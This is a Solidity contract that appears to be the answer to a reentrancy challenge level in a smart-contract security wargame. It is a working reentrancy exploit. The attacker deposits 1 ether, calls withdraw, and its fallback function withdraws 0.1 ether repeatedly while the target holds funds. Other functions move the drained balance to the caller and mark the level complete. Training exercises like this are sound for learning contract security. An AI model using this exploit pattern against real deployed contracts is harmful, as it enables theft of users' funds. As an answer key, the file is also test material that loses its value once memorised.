pragma solidity 0.6.0;
import "./Level_2_Reentrancy.sol";

contract Level_2_Reentrancy_Answer {
    Level_2_Reentrancy public reentrancyContract;

    constructor(address _reentrancyContractAddress) public {
        reentrancyContract = Level_2_Reentrancy(_reentrancyContractAddress);
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        reentrancyContract.deposit.value(1 ether)();
        reentrancyContract.withdraw(1 ether);
    }

    function cashOut() public {
        uint256 _value = reentrancyContract.totalSupply();
        reentrancyContract.transfer(msg.sender, _value);
    }

    function transferBalance() public {
        msg.sender.transfer(address(this).balance);
    }

    function levelComplete() public {
        reentrancyContract.completeLevel();
    }

    fallback() external payable {
        if (address(reentrancyContract).balance > 0.1 ether) {
            reentrancyContract.withdraw(0.1 ether);
        }
    }
}